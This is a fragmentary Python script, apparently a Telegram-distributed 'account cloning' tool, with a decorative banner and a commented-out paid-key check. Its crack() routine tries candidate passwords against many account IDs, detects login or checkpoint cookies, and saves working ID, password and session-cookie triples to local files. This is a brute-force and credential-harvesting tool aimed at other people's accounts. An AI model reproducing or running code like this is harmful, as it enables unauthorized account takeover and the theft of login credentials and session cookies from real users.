...
\033[1;92m                               SCRIPT BY KH4.07
\033[1;92m                               Telegram : @Amanj
\033[1;92m                                Channel   :  @netman 😭
\033[1;92m                               Github   : awesh nea😏
\033[1;92m                              Team   : z9_balla6
\033[1;92m                             Version  :XC90🌺
\033[1;92m  ╔╦══• •✠•❀ X-CARET-PRO ❀•✠ • •══╦╗
\033[1;92m  ╚╩══• •✠•❀ X-CARET-PRO ❀•✠ • •══╩╝
...
# dec by hossam
 ...
 if 1==1:
  ...
  # else:
   # os.system('clear')
   # print("\033[91m 𝗦𝗼𝗿𝗿𝘆 𝗯𝗿𝗼 𝘁𝗵𝗶𝘀 𝘁𝗼𝗼𝗹 𝗶𝘀 𝗽𝗮𝗶𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆 𝗶𝘀 𝗻𝗼𝘁 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝘁𝗼 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆 𝘀𝗲𝗻𝗱 𝗰𝗵𝗮𝘁 𝘁𝗼 𝗼𝘄𝗻𝗲𝗿 @MR_B_L_4_C_K  ")
   # time.sleep(1)
   # exit()
 # except (Exception,KeyError,ConnectionError,ValueError):
  # print('Send Message For Owner >>> https://t.me/MR_B_L_4_C_K')
  # #webbrowser.open('kh4.07')
...
def passwrd():
	...
	write(" \u001b[0m[+] CLONING HAS STARTED")
	write(" [+] PROCESSING")
	write(" [+] FUCK YOUR BYPASS SYSTEM")
	write(" "+"-"*50)
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r\u001b[0m[MR.BLACK] [{loop}|{len(id)}] [\u001b[32;1m{str(ok)}\u001b[0m=\u001b[33;1m{str(cp)}\u001b \u001b[0m ]"),sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\u001b[32;1m\n[OK-BLACK] {idf} | {pw} | {kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				open("/sdcard/XFORD-OK.txt", "a").write(user + "|" + pw + " | " + coki + "\n")
